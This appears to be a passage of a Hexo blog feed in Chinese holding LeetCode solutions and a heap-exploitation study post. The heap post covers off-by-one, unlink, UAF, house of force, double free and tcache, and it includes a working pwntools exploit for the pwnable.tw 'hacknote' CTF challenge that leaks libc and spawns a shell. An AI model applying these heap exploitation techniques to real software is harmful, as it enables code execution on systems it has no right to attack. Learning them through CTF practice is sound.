&#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findBottomLeftValue</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">      queue&lt;TreeNode*&gt; q;</span><br><span class="line">      q.<span class="built_in">push</span>(root);</span><br><span class="line">      <span class="type">int</span> leftnode;</span><br><span class="line">      <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">          <span class="type">int</span> size = q.<span class="built_in">size</span>();</span><br><span class="line">          <span class="keyword">for</span> (<span class="type">int</span> i=size;i;i--)&#123;</span><br><span class="line">              <span class="keyword">auto</span> node = q.<span class="built_in">front</span>();</span><br><span class="line">              <span class="keyword">if</span>(i==size)</span><br><span class="line">                  leftnode = node-&gt;val;</span><br><span class="line">              q.<span class="built_in">pop</span>();</span><br><span class="line">              <span class="keyword">if</span>(node-&gt;left) q.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">              <span class="keyword">if</span>(node-&gt;right) q.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">        <span class="keyword">return</span> leftnode;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="0x02-往完全二叉树添加节点"><a class="markdownIt-Anchor" href="#0x02-往完全二叉树添加节点">#</a> 0x02 往完全二叉树添加节点</h2><p>完全二叉树是每一层（除最后一层外）都是完全填充（即，节点数达到最大，第 n 层有 2n-1 个节点）的，并且所有的节点都尽可能地集中在左侧。</p><p>设计一个用完全二叉树初始化的数据结构 CBTInserter，它支持以下几种操作：</p><p>CBTInserter (TreeNode root) 使用根节点为 root 的给定树初始化该数据结构；<br>CBTInserter.insert (int v)  向树中插入一个新节点，节点类型为 TreeNode，值为 v 。使树保持完全二叉树的状态，并返回插入的新节点的父节点的值；<br>CBTInserter.get_root () 将返回树的根节点。</p><p>示例 1：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：inputs = [<span class="string">&quot;CBTInserter&quot;</span>,<span class="string">&quot;insert&quot;</span>,<span class="string">&quot;get_root&quot;</span>], inputs = [[[<span class="number">1</span>]],[<span class="number">2</span>],[]]</span><br><span class="line">输出：[<span class="literal">null</span>,<span class="number">1</span>,[<span class="number">1</span>,<span class="number">2</span>]]</span><br><span class="line"></span><br><span class="line">输入：inputs = [<span class="string">&quot;CBTInserter&quot;</span>,<span class="string">&quot;insert&quot;</span>,<span class="string">&quot;insert&quot;</span>,<span class="string">&quot;get_root&quot;</span>], inputs = [[[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]],[<span class="number">7</span>],[<span class="number">8</span>],[]]</span><br><span class="line">输出：[<span class="literal">null</span>,<span class="number">3</span>,<span class="number">4</span>,[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>]]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="使用队列完成二叉树的层序遍历"><a class="markdownIt-Anchor" href="#使用队列完成二叉树的层序遍历">#</a> 使用队列完成二叉树的层序遍历</h3><p>通过观察可以发现新节点需要插入层次遍历时第一个出现的 “不完整的节点” （即不同时具有左右孩子节点）。如图中所示，绿色代表当前队列中的节点（规定节点的左右孩子均存在时才将它们一起先后压入队列)，当遍历到 “不完整的节点” 就找到了新节点插入的节点位置，“不完整的节点” 位于队列的头部。在 CBTInserter 函数中实现该过程，找到插入的位置，以及得到当前的队列。</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201301559584.jpeg" alt="ce27c552f3c1d653d97978cf52b4b0d.jpg"></p><p>插入操作时，先后检查队列头部节点的左右孩子，若左孩子缺失则将新节点插入其左孩子，右孩子缺失则插入右孩子。当队列头部节点的左右孩子都存在，则将其左右孩子压入队列尾部，队列的头部节点出队列，因为此时它已不是 “不完整的节点” 。更新后的队列的头部节点将是下一个 “不完整的节点”。按照规则依次处理接下来的插入操作。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CBTInserter</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    queue&lt;TreeNode*&gt; que;</span><br><span class="line">    TreeNode* root;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">CBTInserter</span>(TreeNode* root) &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;root = root;</span><br><span class="line">        que.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">while</span> (que.<span class="built_in">front</span>()-&gt;left != <span class="literal">nullptr</span> &amp;&amp; que.<span class="built_in">front</span>()-&gt;right != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            que.<span class="built_in">push</span>(que.<span class="built_in">front</span>()-&gt;left);</span><br><span class="line">            que.<span class="built_in">push</span>(que.<span class="built_in">front</span>()-&gt;right);</span><br><span class="line">            que.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">insert</span><span class="params">(<span class="type">int</span> v)</span> </span>&#123;</span><br><span class="line">        TreeNode* node = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(v);</span><br><span class="line">        TreeNode* fa = que.<span class="built_in">front</span>();</span><br><span class="line">        <span class="keyword">if</span> (fa-&gt;left == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            fa-&gt;left = node;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            fa-&gt;right = node;</span><br><span class="line">            que.<span class="built_in">push</span>(fa-&gt;left);</span><br><span class="line">            que.<span class="built_in">push</span>(fa-&gt;right);</span><br><span class="line">            que.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> fa-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function">TreeNode* <span class="title">get_root</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>-&gt;root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your CBTInserter object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * CBTInserter* obj = new CBTInserter(root);</span></span><br><span class="line"><span class="comment"> * int param_1 = obj-&gt;insert(v);</span></span><br><span class="line"><span class="comment"> * TreeNode* param_2 = obj-&gt;get_root();</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>时间复杂度为 O (n)，队列中存的节点数为 O (n)，所以空间复杂度为 O (n)。</p>]]></content>
      
      
      <categories>
          
          <category> leetcode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆题总结</title>
      <link href="/2022/01/27/%E5%A0%86%E9%A2%98%E6%80%BB%E7%BB%93/"/>
      <url>/2022/01/27/%E5%A0%86%E9%A2%98%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>堆基础总结</p><span id="more"></span><h2 id="堆数据结构"><a class="markdownIt-Anchor" href="#堆数据结构">#</a> 堆数据结构</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ &lt;-- chunk </span><br><span class="line">| prev_size |  size  |A|M|P|</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">| user <span class="title function_">data</span><span class="params">(fd)</span> | <span class="params">(bk)</span>  |</span><br><span class="line">||</span><br><span class="line">||</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ &lt;-- next chunk</span><br></pre></td></tr></table></figure><h2 id="off-by-one"><a class="markdownIt-Anchor" href="#off-by-one">#</a> Off By One</h2><h3 id="漏洞原理"><a class="markdownIt-Anchor" href="#漏洞原理">#</a> 漏洞原理</h3><p>使用循环语句向堆块中写入数据时，循环次数设置错误导致多写入了一个字节</p><h3 id="利用思路"><a class="markdownIt-Anchor" href="#利用思路">#</a> 利用思路</h3><ol><li><p>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法</p></li><li><p>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得  <code>prev_in_use</code>  位被清，这样前块会被认为是 free 块。</p><p>（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。</p><p>（2） 另外，这时  <code>prev_size</code>  域就会启用，就可以伪造  <code>prev_size</code>  ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照  <code>prev_size</code>  找到的块的大小与 <code>prev_size</code>  是否一致。</p></li></ol><h2 id="large-bin"><a class="markdownIt-Anchor" href="#large-bin">#</a> Large bin</h2><p>当 large bin 中只存在一个 chunk 时，那么该 chunk 的两个 nextsize 指针都会指向自己</p><h2 id="unlink"><a class="markdownIt-Anchor" href="#unlink">#</a> unlink</h2><p>unlink 过程如下图所示，主要实现堆块合并</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190305154531-a6fafb78-3f1a-1.png" alt="img"></p><p>对于 unlink (P,BK,FD) 函数本质是赋值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">unlink(P,BK,FD)&#123;</span><br><span class="line">    FD = P -&gt; fd;</span><br><span class="line">    BK = p -&gt; bk;</span><br><span class="line">    FD -&gt; bk = BK;</span><br><span class="line">    BK -&gt; fd = fd;      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>堆块结构 FD = *(p-0x10)，0x10 是由 fd 指针在堆块的位置决定的，具体利用过程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*(P-&gt;fd+<span class="number">0x18</span>) = *(P-&gt;bk)</span><br><span class="line">*(P-&gt;bk+<span class="number">0x10</span>) = *(P-&gt;fd)</span><br></pre></td></tr></table></figure><h2 id="uaf"><a class="markdownIt-Anchor" href="#uaf">#</a> UAF</h2><h3 id="漏洞原理-2"><a class="markdownIt-Anchor" href="#漏洞原理-2">#</a> 漏洞原理</h3><p>申请任意大小的堆块并在删除时未清空指针数组（即没有设置为 NUL），导致悬空指针从而产生 UAF</p><h3 id="利用思路-2"><a class="markdownIt-Anchor" href="#利用思路-2">#</a> 利用思路</h3><p>例题： <a href="http://pwnable.tw">pwnable.tw</a> - hacknote</p><p>解题思路：</p><p>通过 UAF 调用一个存在于堆块，并且被一系列对操作篡改的函数指针控制流劫持从而 getshell</p><blockquote><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/02/03/hacknote/">具体参考文章</a></p></blockquote><h4 id="exp"><a class="markdownIt-Anchor" href="#exp">#</a> EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./hacknote&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10102</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">io.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;size :&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">io.recvuntil(<span class="string">&quot;Content :&quot;</span>)</span><br><span class="line">io.sendline(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">num</span>):</span><br><span class="line">io.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">num</span>):</span><br><span class="line">io.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">add(<span class="number">64</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">32</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">64</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">show(<span class="number">2</span>)    //unsortbin泄露libc地址</span><br><span class="line"></span><br><span class="line">libc_base = u32(io.recv(<span class="number">8</span>)[<span class="number">4</span>:<span class="number">8</span>])-<span class="number">0x1b07b0</span></span><br><span class="line">system_addr = libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,p32(system_addr)+<span class="string">&quot;;sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="house-of-force"><a class="markdownIt-Anchor" href="#house-of-force">#</a> house of force</h2><h3 id="利用前提"><a class="markdownIt-Anchor" href="#利用前提">#</a> 利用前提</h3><ul><li>能够控制 top chunk 的 size 域（如堆溢出）</li><li>能够自由控制堆分配 size 大小，如申请负数的堆</li></ul><p>向上申请 chunk 实现任意地址写</p><h3 id="例题-bamboobox"><a class="markdownIt-Anchor" href="#例题-bamboobox">#</a> 例题 bamboobox</h3><p>修改长度可以覆盖到 top chunk 的 size 位置从而修改 top chunk size= -1, 因为 size 为无符号数，-1 被解释为 0xffffff。</p><p>利用 house of force 将 top chunk 位置放在 heap base，可以是 got 表地址也可以是分配的堆块地址。</p><p>再申请一个 0x10 堆块去修改函数指针为指定地址。</p><h2 id="double-free"><a class="markdownIt-Anchor" href="#double-free">#</a> Double Free</h2><h3 id="漏洞原理-3"><a class="markdownIt-Anchor" href="#漏洞原理-3">#</a> 漏洞原理</h3><p>free 了两次堆块，在 glibc 中的检查如下：</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190313123823-d61a9032-4549-1.png" alt="img"></p><p>检查 main_arean 是否指向了原来的一个 chunk, 绕过只需要</p><p>free (p1);free (p2);free (p1)，改写 fdd 指针一般执行 add 函数，然后连续 free 出 chunk2,chunk1 和构造的 fake_chunk（这个 chunk 的地址在 got 表上），对 got 表进行一个覆写，将 puts 函数 got 表改写成 magic 函数的地址。</p><h3 id="利用思路-3"><a class="markdownIt-Anchor" href="#利用思路-3">#</a> 利用思路</h3><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190313123837-de246bae-4549-1.png" alt="img"></p><p>malloc 出一个 chunk1，更改 chunk1 的 fd，又由于此时 chunk1 在 fastbin list，因此可以指向一个 fakebin 实现任意地址写</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190313123859-eb7d95dc-4549-1.png" alt="img"></p><h2 id="off-by-null-tcache-overlap"><a class="markdownIt-Anchor" href="#off-by-null-tcache-overlap">#</a> Off by null &amp;&amp; Tcache &amp;&amp; Overlap</h2><ul><li><p>off-by-null: 利用改写将 pre_issue 位改成 \x00 然后导致前面一个堆块莫名其妙的就 free 了（当然不是真的莫名其妙，详细请看堆块结构和记录，简单的说就是 pre_issue 是位了记录前一个堆块 free or use 情况的）。接着就是利用堆块合并，获得一个 free 的但是其实并没有 free 的堆块，这就是 overlap。整个过程其实说明了，off-by-null 可以触发 overlap，并且还是 powerful 的，可以用来泄漏地址。也可以用来修改 fd</p><blockquote><p>strcpy 字符串函数：复制时，遇到结束符  <code>\x00</code>  才会停止复制。复制结束后，会在最后写入一个结束符  <code>\x00</code></p><p><img src="https://img-blog.csdnimg.cn/img_convert/c9a4fb89febac9551f72c9dd1c35929f.png" alt="Pasted image 20210923152332.png"></p><p>strlen: j 不将’\x00’结束符计入字符串长度</p></blockquote></li><li><p>tcache: 这个机制和 fastbin 很像，但是为了效率会比 fastbin 少很多检查。并且堆块都会在 tacahe 走一遍再出来给我们使用，有一些特殊情况不会比如合并了的 unsortedbin。他总共有 7 个，满了才会用其他的类别的 chunk。对 double free 的检查基本没有。</p></li></ul><p>例题：<a href="https://blog.csdn.net/weixin_43921239/article/details/109252945">HITCON_2018_children_tcache</a></p><p>待补充 ing…</p><h2 id="参考文章"><a class="markdownIt-Anchor" href="#参考文章">#</a> 参考文章</h2><p><a href="https://trick.ink/article/Heap_Learn/">https://trick.ink/article/Heap_Learn/</a></p><p><a href="https://blog.csdn.net/m0_56897090/article/details/120510003">https://blog.csdn.net/m0_56897090/article/details/120510003</a></p><p><a href="https://www.freebuf.com/system/171261.html">https://www.freebuf.com/system/171261.html</a></p><p><a href="https://xz.aliyun.com/t/4324#toc-15">https://xz.aliyun.com/t/4324#toc-15</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>leetcode数据结构刷题(一)</title>
      <link href="/2022/01/27/leetcode%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2022/01/27/leetcode%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>Leetcode 数据结构练习</p><span id="more"></span><h2 id="数组"><a class="markdownIt-Anchor" href="#数组">#</a> 数组</h2><h3 id="最大子序和"><a class="markdownIt-Anchor" href="#最大子序和">#</a> 最大子序和</h3><p>思路：动态规划</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxSubArray</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">pre</span> <span class="operator">=</span> <span class="number">0</span>,maxn = nums[<span class="number">0</span>];     </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> x:nums)&#123;</span><br><span class="line">            pre = Math.max(pre+x,x);</span><br><span class="line">            maxn = Math.max(pre,maxn);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxn;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="两数之和"><a class="markdownIt-Anchor" href="#两数之和">#</a> 两数之和</h3><p><strong>哈希表</strong>降时间复杂度从 o (n) 到 o (1)</p><p>创建一个哈希表，对于每一个  <code>x</code> ，我们首先查询哈希表中是否存在  <code>target - x</code> ，然后将  <code>x</code>  插入到哈希表中，即可保证不会让  <code>x</code>  和自己匹配。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] twoSum(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        Map&lt;Integer, Integer&gt; hashtable = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Integer, Integer&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (hashtable.containsKey(target - nums[i])) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;hashtable.get(target - nums[i]), i&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">            hashtable.put(nums[i], i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="合并两个有序数组"><a class="markdownIt-Anchor" href="#合并两个有序数组">#</a> 合并两个有序数组</h3><p>给你两个按 非递减顺序 排列的整数数组 nums1 和 nums2，另有两个整数 m 和 n ，分别表示 nums1 和 nums2 中的元素数目。</p><p>请你 合并 nums2 到 nums1 中，使合并后的数组同样按 非递减顺序 排列。</p><p>注意：最终，合并后数组不应由函数返回，而是存储在数组 nums1 中。为了应对这种情况，nums1 的初始长度为 m + n，其中前 m 个元素表示应合并的元素，后 n 个元素为 0 ，应忽略。nums2 的长度为 n 。</p><blockquote><p>示例 1：</p><p>输入：nums1 = [1,2,3,0,0,0], m = 3, nums2 = [2,5,6], n = 3<br> 输出：[1,2,2,3,5,6]<br> 解释：需要合并 [1,2,3] 和 [2,5,6] 。<br>合并结果是 [1,2,2,3,5,6] ，其中斜体加粗标注的为 nums1 中的元素。<br>示例 2：</p><p>输入：nums1 = [1], m = 1, nums2 = [], n = 0<br> 输出：[1]<br> 解释：需要合并 [1] 和 [] 。<br>合并结果是 [1] 。<br>示例 3：</p><p>输入：nums1 = [0], m = 0, nums2 = [1], n = 1<br> 输出：[1]<br> 解释：需要合并的数组是 [] 和 [1] 。<br>合并结果是 [1] 。<br>注意，因为 m = 0 ，所以 nums1 中没有元素。nums1 中仅存的 0 仅仅是为了确保合并结果可以顺利存放到 nums1 中。</p></blockquote><p>exp</p><p><strong>一、双指针</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">merge</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums1, <span class="type">int</span> m, vector&lt;<span class="type">int</span>&gt;&amp; nums2, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> p1 = <span class="number">0</span>, p2 = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> sorted[m + n];</span><br><span class="line">        <span class="type">int</span> cur;</span><br><span class="line">        <span class="keyword">while</span> (p1 &lt; m || p2 &lt; n) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p1 == m) &#123;</span><br><span class="line">                cur = nums2[p2++];</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (p2 == n) &#123;</span><br><span class="line">                cur = nums1[p1++];</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums1[p1] &lt; nums2[p2]) &#123;</span><br><span class="line">                cur = nums1[p1++];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cur = nums2[p2++];</span><br><span class="line">            &#125;</span><br><span class="line">            sorted[p1 + p2 - <span class="number">1</span>] = cur;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i != m + n; ++i) &#123;</span><br><span class="line">            nums1[i] = sorted[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>复杂度分析</p><p>时间复杂度：O (m+n)<br> 指针移动单调递增，最多移动 m+n 次，因此时间复杂度为 O (m+n)。</p><p>空间复杂度：O (m+n)。<br>需要建立长度为 m+n 的中间数组 sorted。</p><p><strong>二、逆向双指针</strong></p><p>从后向前遍历，将两者较大的元素放在 nums 数组的后面而不会被覆盖，降低了空间复杂度为 O (1)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span 